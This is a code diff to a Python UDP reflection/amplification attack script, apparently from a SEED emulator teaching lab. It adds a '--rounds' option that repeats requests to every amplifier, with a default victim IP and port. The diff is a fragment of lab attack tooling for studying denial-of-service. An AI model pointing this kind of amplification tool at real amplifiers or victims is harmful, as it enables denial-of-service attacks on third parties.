@@ -22,9 +22,18 @@ def parse_args() -> argparse.Namespace:
     parser.add_argument("--token", default="seedemu-lab", help="reflection token configured on amplifiers")
     parser.add_argument("--victim", default="10.151.0.71", help="victim IP for reflection mode")
     parser.add_argument("--victim-port", type=int, default=9000, help="victim UDP port for reflection mode")
+    parser.add_argument(
+        "--rounds",
+        type=int,
+        default=1,
+        help="number of attack rounds; each round contacts every amplifier once",
+    )
     parser.add_argument("--timeout", type=float, default=2.0)
     parser.add_argument("--json", action="store_true", help="print machine-readable results")
-    return parser.parse_args()
+    args = parser.parse_args()
+    if args.rounds < 1:
+        parser.error("--rounds must be at least 1")
+    return args
 
 
 def send_direct_query(sock: socket.socket, target: str, port: int, trigger: str, timeout: float) -> Dict[str, object]:
@@ -71,14 +80,30 @@ def main() -> int:
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
     results: List[Dict[str, object]] = []
-    for amplifier in amplifiers:
-        if args.reflect:
-            results.append(send_reflection_request(sock, amplifier, args.port, args))
-        else:
-            results.append(send_direct_query(sock, amplifier, args.port, args.trigger, args.timeout))
+    try:
+        for round_number in range(1, args.rounds + 1):
+            for amplifier in amplifiers:
+                if args.reflect:
+                    result = send_reflection_request(sock, amplifier, args.port, args)
+                else:
+                    result = send_direct_query(sock, amplifier, args.port, args.trigger, args.timeout)
+                result["round"] = round_number
+                results.append(result)
+    finally:
+        sock.close()
 
     if args.json:
-        print(json.dumps({"results": results}, indent=2, sort_keys=True))
+        print(
+            json.dumps(
+                {
+                    "rounds": args.rounds,
+                    "amplifiers_per_round": len(amplifiers),
+                    "results": results,
+                },
+                indent=2,
+                sort_keys=True,
+            )
+        )
     else:
         for item in results:
             print(item)
